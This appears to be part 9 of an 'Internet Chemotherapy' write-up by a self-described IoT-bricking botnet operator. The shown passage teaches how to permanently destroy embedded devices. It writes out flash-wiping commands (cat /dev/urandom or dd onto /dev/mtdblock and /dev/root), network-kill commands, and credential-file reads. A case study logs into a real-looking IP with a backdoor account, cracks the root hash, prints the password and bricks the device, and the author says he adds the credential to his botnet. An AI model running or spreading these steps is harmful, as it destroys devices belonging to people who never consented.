@@ -1,0 +1,2210 @@
+7/7 2018
+
+
+   ___       _                       _   
+  |_ _|_ __ | |_ ___ _ __ _ __   ___| |_ 
+   | || '_ \| __/ _ \ '__| '_ \ / _ \ __|
+   | || | | | ||  __/ |  | | | |  __/ |_ 
+  |___|_| |_|\__\___|_|  |_| |_|\___|\__|
+                                        
+    ____ _                          _   _                                
+   / ___| |__   ___ _ __ ___   ___ | |_| |__   ___ _ __ __ _ _ __  _   _ 
+  | |   | '_ \ / _ \ '_ ` _ \ / _ \| __| '_ \ / _ \ '__/ _` | '_ \| | | |
+  | |___| | | |  __/ | | | | | (_) | |_| | | |  __/ | | (_| | |_) | |_| |
+   \____|_| |_|\___|_| |_| |_|\___/ \__|_| |_|\___|_|  \__,_| .__/ \__, |
+                                                            |_|    |___/ 
+
+                                                                   PART 9
+
+                                                  Bricking Basics and DIY
+
+ by Dr Cyborkian a.k.a. janit0r - conditioner of 'terminally ill' devices
+
+
+
+Previous parts can be found at least here:
+
+Original (Project Introduction): 
+https://0x00sec.org/t/internet-chemotherapy/4664
+
+Part 2 (ISPs: Lessons from the Rogers Hi-Speed Internet incident): 
+http://depastedihrn3jtw.onion.to/show.php?md5=ee7136ac48fa59fba803b9fbcbc6d7b9 (Clearnet)
+http://depastedihrn3jtw.onion/show.php?md5=ee7136ac48fa59fba803b9fbcbc6d7b9 (Tor)
+
+Part 3 (ISPs: The baffling case of Optify/Keycom's mismanagement):
+http://depastedihrn3jtw.onion.to/show.php?md5=7e7bfe406315f120d8ed325ffb87670b (Clearnet)
+http://depastedihrn3jtw.onion/show.php?md5=7e7bfe406315f120d8ed325ffb87670b (Tor)
+
+Part 4 (ISPs: The dirty case of Telkom South Africa)
+http://depastedihrn3jtw.onion.to/show.php?md5=11830bc79a079f5b7be33bcca84641f6 (Clearnet)
+http://depastedihrn3jtw.onion/show.php?md5=11830bc79a079f5b7be33bcca84641f6 (Tor)
+
+Part 5 (The IoT Battlefield: Device Stability)
+http://depastedihrn3jtw.onion.to/show.php?md5=8ca2bcadeb75137725557a24848d3c17 (Clearnet)
+http://depastedihrn3jtw.onion/show.php?md5=8ca2bcadeb75137725557a24848d3c17 (Tor)
+
+Part 6 (The IoT Battlefield: Mitigation Methods)
+http://depastedihrn3jtw.onion.to/show.php?md5=2c822a990ff22d56f3b9eb89ed722c3f (Clearnet)
+http://depastedihrn3jtw.onion/show.php?md5=2c822a990ff22d56f3b9eb89ed722c3f (Tor)
+
+Part 7 (The IoT Battlefield: Default Passwords)
+http://depastedihrn3jtw.onion.to/show.php?md5=a4232ae8f56034348323ab4483187abb (Clearnet)
+http://depastedihrn3jtw.onion/show.php?md5=a4232ae8f56034348323ab4483187abb (Tor)
+
+Part 8 (The IoT Battlefield: The Where and Why)
+http://depastedihrn3jtw.onion.to/show.php?md5=2a7d5afa2731381a6ead8dbda3005e5d (Clearnet)
+http://depastedihrn3jtw.onion/show.php?md5=2a7d5afa2731381a6ead8dbda3005e5d (Tor)
+
+
+
+--[ Table of contents
+
+  1 - Introduction
+  2 - Bricking 101 
+    2.1 - The flash memory
+    2.2 - Wrapping up
+    2.3 - Fingerprinting systems
+    2.4 - Case study: Simple hacking and bricking
+    2.5 - Finding problem devices
+      2.5.1 - Listening
+      2.5.2 - Active scanning (scan-back)
+      2.5.3 - Honeypots
+      2.5.4 - Other data sources
+  3 - Workarounds
+    3.1 - 'Telnet Killers'
+    3.2 - Alternative Vectors
+    3.3 - The Best Workaround: Patience
+  4 - Finding usable vulnerabilities
+    4.1 - Input sanitation
+    4.2 - Hashes
+    4.3 - Third party tools / additional study materials
+    4.4 - Case study: Finding a simple RCE and creating a payload
+  5 - Notes about original payload module source
+  6 - Simple DIY bricking bot
+    6.1 - Finding vulnerable hosts
+    6.2 - Hacking back vulnerable hosts
+    6.3 - Safety notes about using Tor and torsocks
+      6.3.1 - Observations and deductions about the Tor network
+      6.3.2 - Essential mitigations for using Tor
+   7 - My last experiment
+   8 - Bonus Section: Dahua's Comedy of ERRORs
+
+
+--[ 1 - Introduction
+
+I switched off my last C2 on July 1st 2018 and secured the remaining
+evidence so I'm now officially inactive. I left a few thousands routers 
+online to autonomously hack back anything that tries to scan them, but 
+their days will be numbered.
+
+In the previous part we looked at where the IoT problem has manifested 
+itself, and I made the case for both Western countries and the primary
+device manufacturing countries being relatively insignificant hosters of 
+vulnerable devices. I believe this factor strongly contributes to the 
+problem's seeming unsolvability. When vulnerable device numbers are 
+proportionalized to the sizes of economies and the populations it's clear 
+that the 'IoT problem' has manifested itself mostly in areas of the world 
+that we're unable to control or even influence directly (due to language, 
+cultural and jurisdictional barriers). 
+
+In the previous part I also noted that the vulnerable devices present 
+new opportunities to various belligerents in what could be the early 
+stages of a 'Cyber Cold War' (which further dampens the incentives for 
+solving the problem). Of course such thoughts border on conspiracy 
+theory-esque thinking but would anyone who've been watching IoT trends 
+over the past two years readily dismiss the idea? So far even our own 
+government hasn't approached the IoT security problem with any particular 
+urgency. A cynical reading of initiatives such as the 'IoT Cybersecurity 
+Improvement Act of 2017' will see that they are primarily concerned with 
+reducing the government's own vulnerability profile. As of yet the
+lawmakers don't seem too concerned with you, me or Joe Schmoe being sold
+insecure devices.
+
+Whatever the politics behind the current situation may be I think it's
+worth drawing attention to the observable facts. A little bit of 
+awareness can sometimes go a long way. This is why I decided to start 
+writing instead of just fading away after I had completed my objectives. 
+I've written about a lot of problems that I've seen and my only regret 
+will be that I ran out of time and opportunity to write about more. 
+There are many remarkable stories that will be left untold.
+
+At the end of the day writing only goes so far, though. Actions speak 
+louder than words. Sometimes a decisive action can break through 
+communication barriers that would otherwise be stifling. When well-
+meaning security researchers warn people about new IoT security problems 
+on their English language blogs they generally end up 'preaching to the 
+choir' and chances that some sysadmin in Vietnam would heed and react to 
+the warnings are slim. However, the action of bricking millions of 
+vulnerable devices globally - without regard for who owned them or where 
+they were located - sent a universal message that was harder to ignore or 
+misinterpret (even if you didn't understand what HACKED means). I'm
+by no means claiming that my approach was the best one or let alone a
+complete solution, I'm just claiming that sometimes yin also needs a bit 
+of yang and indeed yang requires some yin for optimal effect.
+
+We're nearing the end of my piecemeal attempt to create a whitepaper. 
+We've talked about a lot of things so far and in this part we'll get to 
+the 'How?' of bricking itself. Although this may seem like a no-brainer 
+to anyone who has ever managed to screw up a firmware update there are 
+many things worth understanding when dealing with the endless variety of 
+non-standard embedded implementations. I'll also discuss some basic DIY 
+ideas with an emphasis on operational security.
+
+
+--[ 2 - Bricking 101 
+
+--[ 2.1 - The flash memory
+
+Typically most IoT systems come with flash storage (as opposed to a 
+hard disk that you'd typically find in a regular computer). From this 
+flash the system will load its operating system and other software 
+required for normal operation. Thus the fundamental objective of typical
+hard bricking attempts is to corrupt the onboard flash memory as this 
+will prevent the system from booting up again. As IoT systems are usually 
+based on embedded Linux stacks the flash memory tends to be available 
+under the MTD (Memory Technology Device) subsystem.
+
+On an embedded Linux system the MTD subsystem is generally exposed as
+/dev/mtd0, /dev/mtd1, /dev/mtd2 etc (up to the number of partitioned
+emulated char devices). Additionally, in order to use a traditional 
+block-based file system on these char devices a block driver called 
+'mtdblock' is normally also provided and these block partitions are 
+usually found in /dev under device names /dev/mtdblock0, /dev/mtdblock1 
+etc. It's not important that you understand the minutiae of how MTD works 
+but you should understand that this is the common way to reference the 
+flash memory on embedded Linux systems.
+
+If you can access the system at a privilege level which allows you to
+write to the /dev/mtd* (and the MTD isn't write-protected in hardware)
+devices then you can simply brick the embedded system by overwriting 
+the flash partitions with arbitrary data. Even overwriting just the first 
+few bytes of the memory should be enough for it to no longer be 
+recognized by a PCB's bootloader (but in my view there's no reason not 
+to corrupt the entire flash while you're at it).
+
+If you have an IoT gadget (with shell access) that you can use for 
+playing around with you can actually learn a little bit about it just by 
+trying these commands (with example output) from a shell: 
+'cat /proc/mtd', 'cat /proc/mounts', and 'cat /proc/partitions'. Don't
+worry, these 3 commands won't harm your gadget in any way.
+
+Example output below:
+
+ $ cat /proc/mtd
+ Using fallback suid method
+ dev:    size   erasesize  name
+ mtd0: 00080000 00010000 "boot"
+ mtd1: 00280000 00010000 "kernel"
+ mtd2: 00d00000 00010000 "rootfs"
+
+ $ cat /proc/mounts
+ Using fallback suid method
+ rootfs / rootfs rw 0 0
+ /dev/root / jffs2 rw,relatime 0 0
+ proc /proc proc rw,relatime 0 0
+ sysfs /sys sysfs rw,relatime 0 0
+ tmpfs /dev tmpfs rw,relatime 0 0
+ devpts /dev/pts devpts rw,relatime,mode=600,ptmxmode=000 0 0
+ /dev/mem /tmp tmpfs rw,relatime,size=8192k 0 0
+
+In the above sample output (from an IP Camera) the first command 'cat 
+/proc/mtd' shows the MTD layout of the system. The size column shows the 
+size of the block in hex, and the erasesize is similar to a block size 
+(in this example the erasesize is expressed in hexadecimal as 0x10000 
+which means that if you wanted to update even a single byte on that block
+of flash memory the OS will have to erase and rewrite the entire 65536 
+byte block).
+
+In the sample output there are 3 mtd partitions, one called 'boot'
+which is the OS bootloader (this is commonly on mtd0). Then there is a
+partition for the system's kernel on mtd1, and in this example the root 
+file system takes up the biggest chunk of the flash memory as mtd2. 
+In order to brick this system we'd at the very minimum need to overwrite
+mtd0's bootloader but there's really no reason why we shouldn't just
+clear all the partitions if we manage to get access to a system we want
+to get rid of.
+
+The 'cat /proc/mounts' output doesn't make us much smarter, but we can
+see that for example /tmp is mounted as a RAM drive (which is typical).
+This explains why filling up /tmp on an embedded system often results 
+in a reboot or panic condition (since filling up the ramdrive may succeed 
+in consuming all the available system RAM and this can even be achieved 
+through an unprivileged account). Many times even other file systems are 
+mounted in RAM and in our above example case /dev/root is probably a RAM 
+copy of the mtd2 rootfs partition's contents (this way the flash memory 
+is not constantly getting written to every time a byte on the rootfs 
+changes which is something that would significantly decrease the system's 
+life span). The fact that it's likely this OS is running off a ramfs copy 
+becomes convenient for us as well since it allows us to clear the entire 
+flash MTD without immediately breaking the system, but it also means that 
+in order to render the system harmless we still have to either reboot it 
+after the partitions have been nuked or come up with some way to 
+disconnect the system from the Internet while the partitions are still 
+being written to (this way resident malware won't be able to continue 
+attacking other hosts on the Internet while the flash memory is still 
+being corrupted).
+
+A very simple and effective way of filling up the flash with garbage is
+to redirect /dev/urandom (this is a pseudo-random output device which 
+commonly exists on most embedded Linuxes) or /dev/zero to the MTD
+block partitions. So in order to nuke the flash of the above system,
+we'd simply type:
+
+ $ cat /dev/urandom >/dev/mtdblock0 &
+ $ cat /dev/urandom >/dev/mtdblock1 &
+ $ cat /dev/urandom >/dev/mtdblock2 &
+ 
+This should fill up the three mtd block partitions with pseudo-random 
+garbage and prevent the system from ever booting up again. You may 
+wonder if it's better to write to /dev/mtd0 (the linear char device) 
+instead of /dev/mtdblock0 (the emulated block device) and generally I've 
+not seen much difference between the two on systems in the wild. 
+Sometimes you may only have the option of writing to one or the other 
+and there's really no harm in just writing random garbage over both to
+play it safe.
+
+If we want to also break the running OS we can then do the same to the 
+RAM-mounted rootfs:
+
+ $ cat /dev/urandom >/dev/root &
+ 
+In this specific case the above command should quite quickly cause the 
+example system's OS to start malfunctioning (but this is a system and
+firmware-dependent outcome).
+
+On systems with the 'dd' binary this is also a good tool for overwriting
+devices. The above equivalent with dd would've looked like this:
+
+  $ dd if=/dev/urandom of=/dev/mtdblock0 &
+  $ dd if=/dev/urandom of=/dev/mtdblock1 &
+  $ dd if=/dev/urandom of=/dev/mtdblock2 &
+  $ dd if=/dev/urandom of=/dev/root &
+
+On some systems the MTD block devices can also be referred to with
+a naming scheme such as /dev/mtdblock/0, /dev/mtdblock/1 etc so it
+always pays to double check the /dev/mtd* contents before determining
+an appropriate bricking payload for a system. Even other block device
+naming schemes are possible (but rare in the wild). If in doubt check 
+the /dev contents and check the contents of '/proc/partitions'.
+
+If for whatever reason the OS doesn't let you write to the block devices
+even as root there may still be some interesting alternative options for
+corrupting the flash. Look inside the /sbin/ - here you may sometimes 
+find mtd-utils such as flash_erase (or anything with the strings 'write', 
+'ftl', 'erase', 'mtd', 'fw', 'format' or 'unlock' in it) which may be 
+able to write to the flash even if it can't be written to directly via 
+the emulated /dev/mtd devices. In some cases you can find setuid 
+binaries with privileges to overwrite flash. In other cases you may
+have to come up with convoluted workarounds, a good example being some
+older Dahuas which require you to 'cat /dev/urandom | mtd_write mtd0 - 
+0 32768' (i.e pipe /dev/urandom output to an /sbin binary called 
+mtd_write with via stdin) in order to brick them.
+
+In the case of no direct shell access there may also be alternative ways 
+of overwriting parts of the flash to bring the system offline such as 
+a CLI option for a factory reset or firmware upload. You can usually find
+some usable workaround provided you're willing to study the system for 
+long enough.
+
+
+--[ 2.2 - Wrapping up
+
+When we have executed our flash or hard disk bricking commands they will
+need a bit of time (at least several seconds) to complete their job. 
+Since our time window for executing commands on the system is often short
+(for reasons I'll get to) we don't want our payload-sending logic to have
+to sit around and wait on anything unnecessarily. The obvious strategy
+here is to look for a way to disconnect the system from the Internet 
+instead of rebooting it. That way the flash or disk-corrupting commands 
+can take as much time as they need without the device posing any further
+risk to the rest of the Internet.
+
+Some of the potentially useful commands to disable networking are:
+
+* route del default - clears the default route from the system (which
+  often is enough to disconnect it from the Internet). Note that if 
+  there's resident malware on the system it can potentially still attack 
+  other LAN hosts even without the default route.
+  
+* iptables -A OUTPUT -j DROP - one of many iptables commands which 
+  will block networking. In case there are some existing rules it may be 
+  a good idea to flush them first with 'iptables -F'
+  
+* ifconfig <interface> down - running this for network interfaces which 
+  exist on the system usually works.
+  
+* ifdown <interface> - alternative to above
+
+In case networking can't be disabled (say the account we've accessed 
+doesn't have enough privileges) it may be useful to opportunistically 
+execute some additional payloads on the system (such as fork bombs). You
+can get an idea of the kinds of things that will work against various 
+devices from my publically leaked payloads.
+
+There may also be some manufacturer-specific custom interface-based 
+options for disabling networking which are equally effective, such as 
+the ability to modify the system's IP (make it something random and
+unroutable).
+
+
+--[ 2.3 - Fingerprinting systems
+
+It should be apparent by now that not every single IoT device is 
+identical. Even if you have a generic way of wiping the common flash
+MTD partitions (which can go a long way) there will be enough CLI
+differences and block partition layout differences for you to want
+to create custom payloads for specific system fingerprints at least
+from time to time.
+
+In my own bot design I opted (not through any great amount of research,
+but simply through organic evolution) for a few different device 
+fingerprinting methods. 
+
+For CLI interfaces (telnet and SSH) I ended up with the obvious solution
+of matching parameters such as login/password and CLI output against 
+regular expressions, and choosing a non-generic payload as soon as 
+there's a match (and if nothing specific matches by the end I test
+against a few generic catch-all payloads for BusyBox, Linux etc). If a
+CLI prompt is detected then we'll also attempt to run a few simple 
+fingerprinting commands for collecting additional CLI responses:
+  
+* 'w' - obviously going for the standard Unix/Linux command of checking
+  who is logged in on a system, which is not commonly supported on 
+  simple Busybox systems (and provides an appropriate error) but 
+  may also trigger some interesting and unique responses on custom
+  CLIs
+  
+* 'uname -a' - may give some interesting system-specific responses.
+
+* 'ls -alF /etc/' - again obvious, and Busybox implementations typically
+  complain about not supporting the -F argument. 
+  
+* 'cat /etc/passwd' - obvious, may get some firmware or system-specific
+  account names that can be matched against, hashes which can be
+  cracked to escalate privileges or useful device-specific backdoor 
+  accounts.
+  
+* 'cat /etc/shadow' - same as above
+
+* 'cat /proc/version' - the kernel version string may contain some useful 
+  substrings for triggering a custom payload.
+  
+By the time I had created a few dozen payloads it became apparent that
+I really should've added a couple more commands to the CLI fingerprinting
+(which I never did for the fear of breaking the matching logic of 
+existing patterns) and it also became clear that commands such as 'w' 
+were not widely supported on stripped down embedded devices. In case you 
+build your own payload matching database from scratch I strongly recommend 
+adding the following two as your initial checks:
+
+* '?' - triggers a help menu (with a lot of custom strings) on a lot of 
+  custom CLIs
+
+* 'help' - same as above
+
+Adding these would've given me a lot more system-specific strings to
+match against and if I ever end up creating a version 2 of my project
+I will redo the payload matching with at least the above checks.
+
+Even so my general recommendation is to try and fingerprint a system as 
+quickly as possible and to not bother with trying to come up with any 
+fancy enumeration-dependent payload generators. The reasons for 
+simplicity are:
+
+* IoT devices on third world networks are often lagged and under a load. 
+  You may not get responses from the device back very quickly (if at 
+  all). Just push a scattershot payload as soon as you have a rough
+  idea of what kind of device it is.
+  
+* You can't always trust that the system reports the actual MTD 
+  partitions. Some lazily put together BusyBox implementations don't 
+  show all of them (or any of them) in /proc/mtd or /proc/mounts
+  output. Even if you try to get fancy you should always include some
+  default common devices such as /dev/mtd0 and /dev/mtdblock0 just
+  in case.
+
+* Some botnets come with a feature called a 'telnet killer' (more on
+  that later) and these will try to terminate the system's telnetd in
+  order to prevent others from accessing the device. In some cases the 
+  'killer' is so unreliable that it keeps killing (and the device OS 
+  watchdog keeps restarting) the telnetd once per second and this 
+  secnario gives you usually only a few hundred milliseconds to push 
+  out your bricking commands. Especially in these cases it's important 
+  to push out the payload immediately after a successful login since
+  you won't get a chance to enumerate the device much beyond that. 
+  
+Because of the above reasons it's best to tag the device with a rough 
+classification as quickly as possible (perhaps through matching a 
+login/password that's specific to a particular type of device) and 
+then push a crude scattershot payload which covers a wide range of 
+potential device configurations (such as the common mtdblock range
+0-7). Think simple and forget any 'obvious refinments' you might've
+thought of when you saw my original payloads.
+
+For fingerprinting HTTP interfaces it's usually necessary to evaluate
+at least the first 1024 bytes of the HTTP response for enough unique
+fingerprintable content. Anything less than that would not have been
+enough for my purposes, but I also never needed more. Whatever limit
+you'll go for it's probably a good idea to have a sane cutoff for the 
+fingerprinting buffer (especially if you're carrying out a lot of 
+regular expression matches as these will be CPU intensive on embedded
+devices).
+
+
+--[ 2.4 - Case study: Simple hacking and bricking
+
+Let's apply the above information in practice.
+
+There's a Chinese semiconductor company called HiSilicon and their
+SoCs are also used in IoT devices. At some point in 2018 I noticed a
+growing number of systems on the Internet with a default backdoor account 
+login guest/123456 (which were also incorporated the HiSilicon stack). 
+The limited guest account isn't powerful enough to do much more than 
+force a device reboot, but thanks to my fingerprinting setup my botnet 
+had also extracted the /etc/shadow contents of the devices. This account
+file revealed a shared DES hash for a root account which we should be able 
+to crack.
+
+Let's connect to one of these systems and find out a bit more about them:
+
+  # telnet 218.161.47.19
+
+  Entering character mode
+  Escape character is '^]'.
+
+  (none) login: guest
+  Password: 
+  sh: using fallback suid method
+  Welcome to HiLinux.
+  ~ $ 
+
+Note that this 'Welcome to HiLinux' banner is common for HiSilicon 
+stacks. Now, let's double-check the user account files:
+
+  ~ $ cat /etc/passwd
+  cat: using fallback suid method
+  root:x:0:0:root:/:/bin/sh
+  guest:x:1000:1000:Linux User,,,:/:/bin/sh
+  ~ $ cat /etc/shadow
+  cat: using fallback suid method
+  root:G8eSfVKTWjZcE:17704:0:99999:7:::
+  guest:IhQlNqID7twUk:16772:0:99999:7:::
+
+On this device the /etc/shadow file reveals the root account hash. Since 
+this hash is an obsolete DES-based hash (which only offers a max of eight 
+7-bit characters of key space) the hash is easily cracked in a few 
+minutes:
+
+  G8eSfVKTWjZcE:e10adc39
+
+By using the root password e10adc39 we'll log back into the device:
+
+  # telnet 218.161.47.19
+
+  Entering character mode
+  Escape character is '^]'.
+  
+  (none) login: root
+  Password: 
+  Welcome to HiLinux.
+  ~ # 
+
+We now have a root shell. Next we'll evaluate a few areas of interest in
+order to determine how to best brick devices of this kind. We'll first 
+check /sbin/ just to get a feeling for the level of binaries offered by 
+the OS, and we find that there's quite a few tools available ranging 
+from fdisk to iptables to a few mkfs-related tools. Even the common 
+route command seems to be supported via the /bin/busybox binary.
+
+Next we'll examine the MTD structure of the device:
+
+  ~ # cat /proc/mtd
+  dev:    size   erasesize  name
+  mtd0: 000c0000 00010000 "boot"
+  mtd1: 00240000 00010000 "sdr020000"
+  mtd2: 00300000 00010000 "rootfs"
+  mtd3: 01400000 00010000 "app"
+  mtd4: 00400000 00010000 "config"
+  mtd5: 00200000 00010000 "log"
+
+  ~ # cat /proc/mounts
+  rootfs / rootfs rw 0 0
+  /dev/root / jffs2 rw,relatime 0 0
+  devtmpfs /dev devtmpfs rw,relatime,size=164496k,nr_inodes=41124,
+    mode=755 0 0
+  proc /proc proc rw,relatime 0 0
+  sysfs /sys sysfs rw,relatime 0 0
+  tmpfs /var tmpfs rw,relatime 0 0
+  tmpfs /run tmpfs rw,relatime 0 0
+  tmpfs /tmp tmpfs rw,relatime 0 0
+  none /sys/kernel/debug debugfs rw,relatime 0 0
+  devpts /dev/pts devpts rw,relatime,mode=600 0 0
+  /dev/mtdblock3 /mnt/mtd jffs2 rw,relatime 0 0
+  /dev/mtdblock4 /mnt/mtd/configInfo jffs2 rw,relatime 0 0
+  /dev/mtdblock5 /mnt/mtd/log jffs2 rw,relatime 0 0
+
+This device appears to have a bootloader on mtd0, probably a root file 
+system on mtd2 and some kind of userspace partition on mtd3. From the
+name it's not entirely clear what the 'sdr020000' partition contains. 
+Often often /dev/mtd1 will contain the kernel and the 'strings' output 
+for the partition suggests this is the case here as well. The 
+/proc/mounts output also indicates that /dev/mtdblock3, /dev/mtdblock4 
+and /dev/mtdblock5 have been mounted directly, and so the other block 
+systems are probably just mounted as RAM copies. The good news from a 
+bricking perspective is that we don't really need to understand the 
+partitions in detail. We just need to know what they are called so that 
+we can nuke them.
+
+Does the device have any other non-MTD devices that we should consider
+wiping as well? Inspecting /proc/partitions reveals a few more items
+of interest:
+
+  ~ $ cat /proc/partitions
+  cat: using fallback suid method
+  major minor  #blocks  name
+
+   240        0        768 romblock0
+    31        0        768 mtdblock0
+   240        1       2304 romblock1
+    31        1       2304 mtdblock1
+   240        2       3072 romblock2
+    31        2       3072 mtdblock2
+   240        3      20480 romblock3
+    31        3      20480 mtdblock3
+   240        4       4096 romblock4
+    31        4       4096 mtdblock4
+   240        5       2048 romblock5
+    31        5       2048 mtdblock5
+     8        0  976762584 sda
+  
+It looks like there's also a /dev/sda that is probably used for storing  
+video and whether you should nuke it or not is a matter of preference. 
+
+Time to get moving. Let's see what happens if we redirect /dev/urandom 
+output to the non-vital device log partition:
+
+  ~ # cat /dev/urandom >/dev/mtdblock5 &
+  ~ # cat: write error: No space left on device
+  ~ # 
+  [1]-  Done(1)                    cat /dev/urandom 1>/dev/mtdblock5
+  ~ # 
+
+Not much seemed to happen from that, but the 'No space left on device' 
+error which showed up after a few seconds indicated that the entire
+partition was overwritten. Note that you can usually do the same to 
+the emulated char device:
+
+  ~ # cat /dev/urandom >/dev/mtd5 &
+  ~ # cat: write error: No space left on device
+  ~ # 
+  [2]+  Done(1)                    cat /dev/urandom 1>/dev/mtd5
+  ~ # 
+
+Again, not much happened, but we might as well overwrite both just in 
+case. Let's see what these devices look like in /dev:
+
+  ~ # ls -al /dev/mtd*
+  crw-------    1 root     root       90,   0 Jan  1  1970 /dev/mtd0
+  crw-------    1 root     root       90,   1 Jan  1  1970 /dev/mtd0ro
+  crw-------    1 root     root       90,   2 Jan  1  1970 /dev/mtd1
+  crw-------    1 root     root       90,   3 Jan  1  1970 /dev/mtd1ro
+  crw-------    1 root     root       90,   4 Jan  1  1970 /dev/mtd2
+  crw-------    1 root     root       90,   5 Jan  1  1970 /dev/mtd2ro
+  crw-------    1 root     root       90,   6 Jan  1  1970 /dev/mtd3
+  crw-------    1 root     root       90,   7 Jan  1  1970 /dev/mtd3ro
+  crw-------    1 root     root       90,   8 Jan  1  1970 /dev/mtd4
+  crw-------    1 root     root       90,   9 Jan  1  1970 /dev/mtd4ro
+  crw-------    1 root     root       90,  10 Jan  1  1970 /dev/mtd5
+  crw-------    1 root     root       90,  11 Jan  1  1970 /dev/mtd5ro
+  brw-------    1 root     root       31,   0 Jan  1  1970 /dev/mtdblock0
+  brw-------    1 root     root       31,   1 Jan  1  1970 /dev/mtdblock1
+  brw-------    1 root     root       31,   2 Jan  1  1970 /dev/mtdblock2
+  brw-------    1 root     root       31,   3 Jan  1  1970 /dev/mtdblock3
+  brw-------    1 root     root       31,   4 Jan  1  1970 /dev/mtdblock4
+  brw-------    1 root     root       31,   5 Jan  1  1970 /dev/mtdblock5
+
+The /dev/mtdXro devices are read-only char device representations and it 
+would usually make no sense to try writing over these! 
+
+Now let's see what happens when we write garbage over the rest of the
+block partitions:
+
+  ~ # cat /dev/urandom >/dev/mtdblock4 &
+  ~ # cat: write error: No space left on device
+  ~ # 
+  ~ # cat /dev/urandom >/dev/mtdblock1 &
+  ~ # cat: write error: No space left on device
+  ~ # 
+
+So far so good. But what happens when we overwrite the 'rootfs' and 'app'
+partitions?
+
+  ~ # cat /dev/urandom >/dev/mtdblock3 &
+  ~ # cat /dev/urandom >/dev/mtdblock2 &
+  ~ # cat: write error: No space left on device
+  [2]+  Done(1)                    cat /dev/urandom 1>/dev/mtdblock2
+  ~ # cat: write error: No space left on device
+  [1]+  Done(1)                    cat /dev/urandom 1>/dev/mtdblock3
+  ~ # 
+
+Note that although we started the mtdblock3 write before mtdblock2 the
+latter finished first, and this was obviously because the mtdblock3 
+partition is much larger.
+
+So, now we seem to have cleared the device flash, does it still work?
+
+  ~ # ps w
+  PID   USER     TIME   COMMAND
+      1 root       0:00 init
+      2 root       0:00 [kthreadd]
+      3 root       0:12 [ksoftirqd/0]
+      4 root       1:19 [kworker/0:0]
+      5 root       0:00 [kworker/0:0H]
+      7 root       0:00 [khelper]
+      8 root       0:00 [kdevtmpfs]
+      9 root       0:00 [kworker/u2:1]
+    166 root       0:00 [writeback]
+    168 root       0:00 [bioset]
+    170 root       0:00 [kblockd]
+    176 root       0:00 [ata_sff]
+    183 root       0:00 [spi0]
+    190 root       0:00 [khubd]
+    200 root       0:00 [cfg80211]
+    283 root       0:00 [cfinteractive]
+    284 root       0:00 [rpciod]
+    294 root       0:00 [kswapd0]
+    340 root       0:00 [fsnotify_mark]
+    349 root       0:00 [nfsiod]
+    359 root       0:00 [crypto]
+    372 root       0:00 [kapmd]
+    434 root       0:00 [scsi_eh_0]
+    437 root       0:00 [scsi_eh_1]
+    440 root       0:00 [kworker/u2:2]
+    509 root       0:00 [kpsmoused]
+    534 root       0:00 [deferwq]
+    552 root       0:00 [jffs2_gcd_mtd2]
+    566 root       0:00 udevd --daemon
+    568 root       0:00 udevd --daemon
+    580 root       0:00 udevd --daemon
+    934 root       0:02 [jffs2_gcd_mtd3]
+    944 root       0:00 [jffs2_gcd_mtd4]
+    946 root       0:00 [jffs2_gcd_mtd5]
+   1248 root       0:46 [ktp2827]
+   1331 root       0:00 /sbin/getty -L ttyS000 115200 vt100
+   1332 root       0:00 ./appDaemon
+   1333 root      18:06 ./NVMS9000 -qws
+   1337 root       0:06 /usr/sbin/telnetd
+   1351 root       3:15 [HI_VFMW_VideoDe]
+   1387 root       0:00 [HDMI_kthread]
+   1395 root       0:09 /mnt/mtd/ConfigSyncProc /mnt/mtd/Web/ 127.0.0.1 4567 80 false 443
+   1419 root       0:00 [kworker/0:1H]
+   1546 root       0:00 {exe} ash /pppoe/adsl-connect
+   2889 root       0:00 -sh
+   2988 root       0:00 [kworker/0:1]
+   3021 root       0:00 /usr/sbin/pppd pty /usr/sbin/pppoe -p /var/run/adsl.pid.pppoe -I eth0 -T 80 -U  -m 1412    noipdefault noauth
+   3022 root       0:00 sh -c /usr/sbin/pppoe -p /var/run/adsl.pid.pppoe -I eth0 -T 80 -U  -m 1412   
+   3025 root       0:00 /usr/sbin/pppoe -p /var/run/adsl.pid.pppoe -I eth0 -T 80 -U -m 1412
+   3070 root       0:00 [kworker/u2:0]
+   3104 root       0:00 /bin/login
+   3105 root       0:00 /bin/login
+   3106 root       0:00 /bin/login
+   3107 root       0:00 ps w
+ 
+Yup, it still works, presumably because the rootfs has been mounted as a 
+RAM copy. Some of the running processes (such as ./NVMS9000) reinforce
+our guess that this is an IP camera or NVR of some sort, but this is not
+particularly interesting to us since the probability of us getting a hold 
+of the manufacturer/vendor and getting them to patch all the vulnerable 
+devices in the field is non-existent. We'll therefore focus on the 
+bricking objective as our only viable solution for closing the 
+vulnerability. Next we'll see what happens if we try to overwrite 
+/dev/root:
+
+  ~ # cat /dev/urandom >/dev/root &
+  ~ # 
+  [17]+  Segmentation fault        cat /dev/urandom 1>/dev/root
+  ~ # 
+  ~ # uptime
+  Segmentation fault
+  ~ # ps
+  Segmentation fault
+
+We don't need an IoT degree from FIU to realize that the segfaulting 
+doesn't bode well for the device. Most commands end up segfaulting, 
+presumably because some relevant parts of the ramfs OS were overwritten. 
+
+This broken state exemplifies why one of the core objectives is simply to
+disable the networking of the system early on - there's no guarantee that
+any resident malware on the device wouldn't be able to continue running
+even if the OS is busted. If we're able to disconnect the device before 
+any vital OS functions are affected then it doesn't matter what state the
+device ends up in while the boot and other partitions are being 
+overwritten. 
+
+On our example device we've obviously waited too long before trying to
+disable the networking, but let's see if we can still do something:
+
+  / # route del default
+
+Miraculously the 'route del default' doesn't segfault and it also seems 
+to have caused our device connection to hang! The route command had been 
+symlinked to /bin/busybox but we still managed to execute it in spite of
+many other OS functions no longer working. We'll try to reconnect:
+
+  # telnet 218.161.47.19
+  telnet: cannot connect to remote host (218.161.47.19): Connection timed 
+  out
+  #   
+
+The connection attempt timed out and the device should now be unbootable. 
+Mission accomplished.
+
+Nuking a single device manually is of course only a drop in the ocean 
+and so we have to consider ways to automatically carry out these steps 
+against any other devices like this one on the Internet. This is why a 
+bot/botnet with an ability to fingerprint devices and execute appropriate
+payloads will come in handy.
+
+Fortunately my generic 'busybox' payload already does a reasonable job of
+covering the relevant partitions as-is, so we don't need to create a 
+custom payload for bricking other devices similar to this one. In this 
+case I'll just add the hardcoded root login root/e10adc39 to my botnet's 
+brute force dictionary list and see what happens. The fact that the device 
+we just examined seems to be clear from malware also suggests that the 
+blackhats may not have figured out these backdoor logins yet. That means 
+that we're getting first dibs on the device pool and maybe even the
+manufacturer will be forced to fix the vulnerability when warranty 
+returns start piling up.
+
+Here's a log of the number of hits found on unique IP:ports over the last 
+few days of June:
+
+ Date                Hits
+ 
+ 2018-06-21             0
